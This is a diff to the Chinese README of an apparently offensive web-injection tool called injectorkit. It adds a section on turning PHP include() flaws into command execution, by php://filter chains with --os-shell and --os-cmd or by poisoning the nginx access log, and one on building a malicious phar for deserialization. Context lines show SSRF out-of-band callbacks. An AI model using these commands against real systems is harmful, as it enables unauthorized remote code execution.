@@ -40,7 +40,36 @@ Python 3.11 或更新。核心零第三方依赖，检出即可运行。经 inte
     python injectorkit.py ssrf -u "http://target/api/fetch?url=x" --param url --oob 10.0.0.5:8081
     python injectorkit.py ssrf -u "http://target/api/fetch?url=x" --oob-interactsh oast.pro
 
-每种漏洞类型是一个子命令，各自有专属选项，再加上所有子命令共享的引擎选项（传输、绕过预算、会话、详细程度）。
+每种漏洞类型是一个子命令，各自有专属选项，再加上所有子命令共享的引擎选项（传输、绕过预算、进度存储、详细程度）。
+
+### 拿 shell
+
+穿过一个 `include()` 点拿到执行有两条路，走哪条由目标决定，不是偏好问题：
+
+- `--exploit` 现场生成一条 `php://filter` 链来跑 —— `--os-shell` 给一个会话，`--os-cmd` 只跑一条命令。这要求应用接受 `php://filter`。
+- `--log-path /var/log/nginx/access.log` 把 PHP 源码种进服务器自己写的文件里，再 include 它。这条路只要纯路径 —— 而拒绝一切 wrapper 的目标，恰好只放行纯路径。
+
+两条都会在目标上执行命令，所以都要 `--exploit`：
+
+    python injectorkit.py proto -u "https://target/" --forms --exploit \
+        --log-path /var/log/nginx/access.log --os-cmd 'id'
+
+### 走到反序列化
+
+`--make-phar` 在本地生成归档，因为造一个 phar 不该要求本机装 PHP：
+
+    python injectorkit.py proto -u "https://target/" --make-phar evil.phar \
+        --phar-class SomeFrameworkClass --phar-set 'path=/tmp/pwn'
+
+自己传上去，再用 `--upload` 指向它的落点。用之前值得知道：**PHP 8 上打开 phar 不会反序列化 metadata**，只有 `(new Phar(...))->getMetadata()` 会，所以这条链需要目标主动去取 metadata —— 框架代码会，裸 `include` 不会。
+
+### 同一个扫描跑第二遍
+
+进度默认存在 `.injectorkit/` 下，按主机与页面分。在一个页面上跑过的动作不会再跑，所以同一页面扫第二遍几乎不发包，而不是把已经写在板上的答案重新问一遍。
+
+    --flush-session     忘掉之前几次跑在这个主机上学到的东西
+    --state FILE        改用你自己指定的位置
+    --retries N         连接掉线后重试几次（默认 1）
 
 ### 回调
 
